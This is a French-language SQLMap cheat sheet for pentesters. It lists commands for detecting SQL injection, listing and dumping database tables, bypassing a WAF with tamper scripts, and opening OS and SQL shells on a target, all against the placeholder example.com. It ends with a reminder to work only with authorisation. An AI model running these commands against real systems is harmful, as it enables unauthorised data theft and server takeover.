### **Présentation de SQLMap et Contexte d'Utilisation**

SQLMap est un outil open-source automatisé conçu pour détecter et exploiter des failles de type injection SQL (SQL Injection) dans des applications web. Il est largement utilisé dans les tests de pénétration pour manipuler les bases de données vulnérables et extraire des informations sensibles.

Dans le cadre d'une SQL Injection, SQLMap se distingue par sa capacité à automatiser les tests, à supporter différents types de bases de données (MySQL, PostgreSQL, Oracle, etc.) et à offrir des options avancées pour documenter les vulnérabilités. Grâce à son interface en ligne de commande, SQLMap est un outil puissant et flexible, idéal pour les pentesters et les professionnels de la cybersécurité.

---

### **Commandes SQLMap pour une SQL Injection**

#### **1. Détection et Identification**  
- **Tester une URL pour une vulnérabilité SQL :**  
```bash  
sqlmap -u "http://example.com/page?id=1"  
```  
- **Identifier le type de base de données et la bannière du serveur :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --banner  
```

---

#### **2. Extraction de Données**  
- **Lister les bases de données accessibles :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --dbs  
```  
- **Lister les tables d'une base de données spécifique :**  
```bash  
sqlmap -u "http://example.com/page?id=1" -D nom_base --tables  
```  
- **Lister les colonnes d'une table spécifique :**  
```bash  
sqlmap -u "http://example.com/page?id=1" -D nom_base -T nom_table --columns  
```  
- **Extraire les données d'une table spécifique :**  
```bash  
sqlmap -u "http://example.com/page?id=1" -D nom_base -T nom_table -C nom_colonne --dump  
```

---

#### **3. Attaques Avancées**  
- **Tester une injection dans un formulaire POST :**  
```bash  
sqlmap -u "http://example.com/login" --data="username=admin&password=1234"  
```  
- **Contourner un pare-feu d'application web (WAF) :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment  
```  
- **Exécuter une commande système via l'injection SQL :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --os-shell  
```  
- **Accéder à un shell SQL interactif :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --sql-shell  
```

---

#### **4. Options de Personnalisation**  
- **Spécifier une base de données ou une table cible :**  
```bash  
sqlmap -u "http://example.com/page?id=1" -D nom_base -T nom_table  
```  
- **Limiter le test à un type de base de données spécifique :**  
```bash  
sqlmap -u "http://example.com/page?id=1" --dbms=mysql  
```

---

### **Conclusion**

SQLMap est un outil essentiel pour détecter et exploiter les failles SQL Injection grâce à son automatisation et sa puissance. Son utilisation permet d'accélérer l'analyse et de simplifier la documentation des vulnérabilités rencontrées. Toutefois, il est indispensable d'utiliser SQLMap dans un cadre légal et éthique, avec l'autorisation explicite des propriétaires des systèmes testés.
